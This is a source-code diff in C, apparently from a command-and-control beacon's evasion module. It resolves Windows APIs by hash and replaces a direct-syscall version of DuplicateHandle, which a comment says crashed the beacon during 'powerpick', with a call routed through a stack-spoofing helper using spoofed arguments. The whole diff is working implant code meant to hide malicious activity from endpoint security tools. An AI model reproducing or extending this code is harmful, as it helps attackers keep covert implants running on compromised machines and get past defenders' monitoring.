@@ -6,19 +6,20 @@
 #include "spoof.h"
 #include "syscalls.h"
 
-DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
-DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA    ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );
+DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA       ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
+DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA          ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );
 
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessA        ( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateRemoteThread    ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread          ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
-DECLSPEC_IMPORT VOID   WINAPI KERNEL32$RtlCaptureContext     ( PCONTEXT );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CreateProcessA        ( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
+DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateRemoteThread    ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
+DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateThread          ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$DuplicateHandle       ( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
+DECLSPEC_IMPORT VOID      WINAPI KERNEL32$RtlCaptureContext     ( PCONTEXT );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect        ( LPVOID, SIZE_T, DWORD, PDWORD );
 
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
+DECLSPEC_IMPORT HRESULT   WINAPI OLE32$CoCreateInstance         ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
 
-DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue ( CONTEXT *, BOOLEAN );
+DECLSPEC_IMPORT ULONG     NTAPI  NTDLL$NtContinue               ( CONTEXT *, BOOLEAN );
 
-DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect     ( LPVOID, SIZE_T, DWORD, PDWORD );
 
 // Use utils\hash.py to generate these hashes
 #define NTDLL_HASH                   0x3CFA685D
@@ -239,9 +240,26 @@ HRESULT WINAPI _CoCreateInstance ( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD d
 
 BOOL WINAPI _DuplicateHandle ( HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions )
 {
+    // The syscall version crashed the beacon when running the `powerpick $pid` command
+    /*
     SYSCALL syscall = { 0 };
     if ( ! prepare_nt_syscall ( NTDLL_HASH, NTDUPLICATEOBJECT_HASH, &syscall ) ) return FALSE;
     return ( NTSTATUS ) do_syscall ( hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle ? OBJ_INHERIT : 0, dwOptions ) == 0;
+    */
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr  = ( PVOID ) ( KERNEL32$DuplicateHandle );
+    call.argc = 7;
+    
+    call.args [ 0 ] = spoof_arg ( hSourceProcessHandle );
+    call.args [ 1 ] = spoof_arg ( hSourceHandle );
+    call.args [ 2 ] = spoof_arg ( hTargetProcessHandle );
+    call.args [ 3 ] = spoof_arg ( lpTargetHandle );
+    call.args [ 4 ] = spoof_arg ( dwDesiredAccess );
+    call.args [ 5 ] = spoof_arg ( bInheritHandle );
+    call.args [ 6 ] = spoof_arg ( dwOptions );
+
+    return ( BOOL ) spoof_call ( &call );
 }
 
 HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
